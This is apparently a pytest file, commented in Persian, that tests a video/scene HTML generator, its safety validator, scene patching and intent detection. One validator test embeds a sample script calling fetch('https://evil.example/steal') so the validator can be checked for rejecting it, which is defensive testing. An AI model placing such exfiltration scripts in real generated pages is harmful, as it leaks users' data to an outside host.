# -*- coding: utf-8 -*-
"""
تست‌های موتورِ ویدیو/صحنه‌یِ TRX (``trx_ai/video/``) و نیت‌هایِ آن.

این فایل سه ردیف را پوشش می‌دهد:
    ۱) صحتِ عملکردِ داخلیِ ماژول (ساخت/اعتبارسنجی/پچ/نشست) -- بدونِ نیاز
       به core.py یا هیچ سرویسِ بیرونی.
    ۲) دقتِ تشخیصِ نیت (video_generation/video_edit_scene) شاملِ چند
       موردِ منفی که واقعاً در توسعه کشف شدند (فازِ ممیزی -- بخشِ ۲۴ سندِ
       طراحی: «جمله‌ی احساسی/عمومی نباید به‌اشتباه به ابزار برود»).
    ۳) رگرسیون: هیچ‌کدام از نیت‌هایِ قبلیِ پروژه نباید توسطِ اضافه‌شدنِ
       نیت‌هایِ ویدیو تغییر کند (زیرمجموعه‌ای از خودِ ``INTENT_CASES`` در
       ``test_intent_engine.py`` -- عمداً کپی نشده، فقط چند نمونه‌ی
       پرریسک/نزدیک به کلیدواژه‌هایِ ویدیو انتخاب شده‌اند).

توجه: بخش‌هایِ ۱ و ۲ کاملاً محلی و بدونِ وابستگی به aiohttp/دیتابیس
هستند. اگر importِ ``trx_ai.nlu``/``trx_ai.intelligence`` در محیطِ تست
به aiohttp نیاز داشت (طبقِ زنجیره‌ی importِ فعلیِ پروژه: nlu -> intents
-> psychology -> medical -> tools -> aiohttp)، این یک وابستگیِ ازپیش
موجودِ پروژه است، نه چیزی که این فایل اضافه کرده باشد.
"""

from __future__ import annotations

import os

import pytest

from trx_ai.video import scene_builder, html_generator, validator, request_normalizer
from trx_ai.video import patch_engine, runtime_manager as rt
from trx_ai.video.session_manager import SceneSessionStore
from trx_ai.video import session_manager as sm


@pytest.fixture(autouse=True)
def isolated_session_store(monkeypatch, tmp_path):
    """هر تست با یک SceneSessionStoreِ تازه (بدونِ persist رویِ دیسکِ
    واقعی) اجرا می‌شود -- تا نشست‌ها بینِ تست‌ها نشتی نکنند."""
    store = SceneSessionStore(persist_path=None)
    monkeypatch.setattr(sm, "_default_store", store)
    return store


# ----------------------------------------------------------------------
#   ۱) ساخت/اعتبارسنجی/تولیدِ HTML -- سطحِ پایین، بدونِ core
# ----------------------------------------------------------------------

def test_build_scene_and_generate_valid_html():
    norm = request_normalizer.normalize_request("یه صحنه ۶ ثانیه‌ای زیر آب بساز با نور آبی و حباب")
    assert norm["environment"] == "underwater"
    scene = scene_builder.build_scene(norm, quality="medium")
    assert scene.validate() == []
    html = html_generator.generate_html(scene)
    report = validator.validate_html(html)
    assert report["passed"], report["issues"]


@pytest.mark.parametrize("environment", [
    "underwater", "rain_on_window", "forest", "desert", "city",
    "sky", "night_sky", "room", "lab", "ancient_persia",
])
def test_every_environment_produces_valid_html(environment):
    """رگرسیونِ ساده اما مهم: هر ده محیطِ تعریف‌شده باید HTMLِ معتبر
    تولید کند -- نه فقط محیطِ پیش‌فرض (room/underwater) که در تستِ بالا
    دستی امتحان شده."""
    norm = {"duration": 5.0, "style": "cinematic", "environment": environment,
            "camera": "slow_push_in", "audio": "ambient", "mood": "calm",
            "aspect_ratio": "16:9", "is_edit_hint": False, "raw_text": ""}
    scene = scene_builder.build_scene(norm, quality="medium")
    html = html_generator.generate_html(scene)
    report = validator.validate_html(html)
    assert report["passed"], f"{environment}: {report['issues']}"


def test_validator_rejects_actually_unsafe_html():
    """اطمینان از اینکه validator شُل نیست -- یک نمونه‌ی واقعاً ناامن باید
    رد شود (تا رگرسیونی مثلِ حذفِ ناخواسته‌ی یک الگو رد نشود)."""
    unsafe = '<!DOCTYPE html><html><body><div id="scene-root"></div>' \
             '<script>fetch("https://evil.example/steal")</script></body></html>'
    report = validator.validate_html(unsafe)
    assert not report["passed"]
    assert any("fetch" in issue or "شبکه" in issue for issue in report["issues"])


def test_generated_html_never_contains_forbidden_words_even_in_comments():
    """رفعِ باگِ واقعاً کشف‌شده در توسعه: یک کامنتِ توضیحیِ خودِ Generator
    که کلمه‌ی «XMLHttpRequest» را در متنِ فارسی می‌آورد نباید توسطِ
    validator به‌عنوانِ استفاده‌ی واقعی تشخیص داده شود و صحنه را به
    fallback بیندازد."""
    norm = request_normalizer.normalize_request("یه ویدیو از جنگل بساز")
    scene = scene_builder.build_scene(norm, quality="medium")
    html = html_generator.generate_html(scene)
    report = validator.validate_html(html)
    assert report["passed"], report["issues"]


# ----------------------------------------------------------------------
#   ۲) runtime_manager: قراردادِ ورودی/خروجی + سناریوهایِ واقعی
# ----------------------------------------------------------------------

def test_create_then_patch_same_session_keeps_scene_id():
    r1 = rt.handle_video_request("s1", "video_generation", "یه صحنه ۸ ثانیه‌ای بارون روی شیشه بساز، حس آروم")
    assert r1["status"] == "success"
    assert os.path.exists(r1["html_path"])

    r2 = rt.handle_video_request("s1", "video_edit_scene", "دوربین رو یکم نزدیک‌تر کن")
    assert r2["status"] == "success"
    assert r2["mode"] == "patch"
    assert r2["scene_id"] == r1["scene_id"], "پچ نباید scene_id را عوض کند"
    assert r2["applied_patch"]


def test_multiple_patches_accumulate_on_same_scene():
    r1 = rt.handle_video_request("s1", "video_generation", "یه ویدیو از کویر بساز")
    r2 = rt.handle_video_request("s1", "video_edit_scene", "نور رو کم کن")
    r3 = rt.handle_video_request("s1", "video_edit_scene", "همین رو شب کن")
    assert r2["scene_id"] == r1["scene_id"] == r3["scene_id"]
    assert r2["applied_patch"] and r3["applied_patch"]


def test_sessions_are_isolated():
    r1 = rt.handle_video_request("s1", "video_generation", "یه ویدیو از جنگل مه‌آلود بساز")
    r2 = rt.handle_video_request("s2", "video_generation", "یه ویدیو از جنگل مه‌آلود بساز")
    assert r1["scene_id"] != r2["scene_id"], "دو نشستِ متفاوت نباید صحنه‌ی مشترک ببینند"


def test_edit_intent_without_active_scene_asks_for_clarification_instead_of_guessing():
    """رفعِ باگِ واقعاً کشف‌شده: قبل از این رفع، جمله‌ای مثلِ «نور خونه رو
    روشن کن» بدونِ هیچ صحنه‌ی فعالی، یک صحنه‌ی کاملاً بی‌ربط و الکی
    می‌ساخت. رفتارِ درست: پرسیدنِ توضیح با مثالِ واقعی و قابلِ‌اجرا، نه
    ساختنِ چیزی که کاربر نخواسته و نه یک پیامِ کلیِ بدونِ راهنمایی."""
    result = rt.handle_video_request("brand_new_session", "video_edit_scene", "نور خونه رو روشن کن")
    assert result["status"] == "needs_clarification"
    # رفعِ شکایتِ کاربر: پیام باید شاملِ یک مثالِ واقعاً کاربردی باشد،
    # نه فقط «بگویید چه ویدیویی بسازم» بدونِ هیچ نمونه‌ای.
    assert "یه ویدیو از زیر آب بساز" in result["message"]


def test_video_help_intent_and_message_content():
    """راهنمای مستقل («راهنمای ویدیو» / «چطور انیمیشن بسازم») باید نمونه‌های
    واقعی و اجراشونده‌ی ساخت و اصلاح را نشان دهد -- دقیقاً همان چیزی که
    قبلاً هیچ‌جا (نه در /راهنمایِ عمومی، نه در پیامِ خطا) گفته نمی‌شد."""
    from trx_ai.nlu import scorer
    for text in ("راهنمای ویدیو", "چطور انیمیشن بسازم", "چطوری یه صحنه بسازم"):
        assert scorer.detect(text).intent == "video_help", text

    result = rt.handle_video_request("any", "video_help", "راهنمای ویدیو")
    assert result["status"] == "help"
    assert "یه ویدیو از زیر آب بساز" in result["message"]
    assert "دوربین رو نزدیک‌تر کن" in result["message"]


def test_single_word_command_does_not_crash():
    result = rt.handle_video_request("s_edge", "video_generation", "بساز")
    assert result["status"] == "success"


def test_creation_phrase_containing_edit_like_word_is_still_creation():
    """رگرسیونِ ظریف: «یه ویدیو با نور کم بساز» شاملِ کلمه‌ی «کم» است که
    در video_edit_scene هم به‌کار می‌رود، اما چون فعلِ صریحِ «بساز» +
    اسمِ «ویدیو» دارد، باید create باشد -- نه اینکه (وقتی صحنه‌ای هم در
    کار نیست) به‌اشتباه بیفتد به مسیرِ اصلاح."""
    result = rt.handle_video_request("s_mix", "video_generation", "یه ویدیو با نور کم بساز")
    assert result["status"] == "success"
    assert result["mode"] == "create"


def test_patch_engine_darken_variants():
    for phrase in ("همین را شب کن", "همینو شب کن", "همین رو شب کن"):
        assert patch_engine.detect_patch_operation(phrase) == "darken_mood", phrase


# ----------------------------------------------------------------------
#   ۳) دقتِ تشخیصِ نیت -- مثبت، منفی، و رگرسیونِ نیت‌هایِ دیگر
# ----------------------------------------------------------------------

_POSITIVE_GENERATION = [
    "یه صحنه هشت ثانیه‌ای زیر آب بساز با نور آبی و حباب",
    "یک انیمیشن سینمایی بارانی بساز",
    "صحنه ۶ ثانیه‌ای بارون روی شیشه درست کن",
    "این تصویر رو متحرک کن",
    # فرم‌هایِ غیرامری/محاوره‌ای -- در توسعه کشف شد که این‌ها هم باید
    # ساختِ صحنه را فعال کنند، نه اینکه به general سقوط کنند.
    "ویدیو بسازی برام؟",
    "یه ویدیو میخوام",
    "یه انیمیشن از باران میخوام",
    # جمله‌ی ترکیبی: باید «ساخت» تشخیص داده شود، نه با کلمه‌ی «کم» به
    # اشتباه «اصلاحِ نور» (چون هیچ صحنه‌ای هنوز وجود ندارد).
    "یه ویدیو با نور کم بساز",
]

_POSITIVE_EDIT = [
    "دوربین رو یکم نزدیک‌تر کن",
    "نور رو کم کن",
    "همین رو شب کن",
]

# این‌ها نباید موتورِ ویدیو را فعال کنند -- ترکیبی از نمونه‌هایِ خودِ
# بخشِ ۲۴ سندِ طراحی + مواردی که در توسعه واقعاً false-positive بودند.
_NEGATIVE = [
    "ویدیو چیست",
    "چطور انیمیشن بسازم",
    "حساب کن ۲+۲",
    "خسته شدم",
    "امروز خیلی خوب بود",
    "کد ویدیو رو توضیح بده",
    "این ویدیو رو ترجمه کن",
]


@pytest.mark.parametrize("text", _POSITIVE_GENERATION)
def test_video_generation_intent_detected(text):
    from trx_ai.nlu import scorer
    result = scorer.detect(text)
    assert result.intent == "video_generation", f"{text!r} -> {result.intent} ({result.confidence})"


@pytest.mark.parametrize("text", _POSITIVE_EDIT)
def test_video_edit_intent_detected(text):
    from trx_ai.nlu import scorer
    result = scorer.detect(text)
    assert result.intent == "video_edit_scene", f"{text!r} -> {result.intent} ({result.confidence})"


@pytest.mark.parametrize("text", _NEGATIVE)
def test_video_intents_do_not_over_trigger(text):
    from trx_ai.nlu import scorer
    result = scorer.detect(text)
    assert result.intent not in ("video_generation", "video_edit_scene"), \
        f"{text!r} نباید موتورِ ویدیو را فعال می‌کرد، اما -> {result.intent}"


def test_existing_intents_are_not_broken_by_new_video_intents():
    """زیرمجموعه‌ای از رگرسیونِ اصلیِ پروژه (test_intent_engine.py) --
    فقط مواردی که از نظرِ کلیدواژه به دامنه‌ی ویدیو نزدیک‌اند (نور/دوربین/
    زمان/محاسبه) دوباره اینجا چک می‌شوند تا اگر کسی این تستِ ویدیو را
    جدا اجرا کرد هم رگرسیون فوراً دیده شود."""
    from trx_ai.intelligence import IntentEngine
    cases = [
        ("۵ بعلاوه ۳ چقدر میشه", "calculator"),
        ("هوای تهران چطوره", "weather"),
        ("الان ساعت چنده", "system_time"),
        ("این جمله رو به انگلیسی ترجمه کن", "translator"),
        ("سردرد و تب دارم", "medical"),
    ]
    for text, expected in cases:
        intent, _conf, _ = IntentEngine.detect_intent(text, None, None)
        assert intent == expected, f"{text!r} باید '{expected}' می‌گرفت، گرفت '{intent}'"
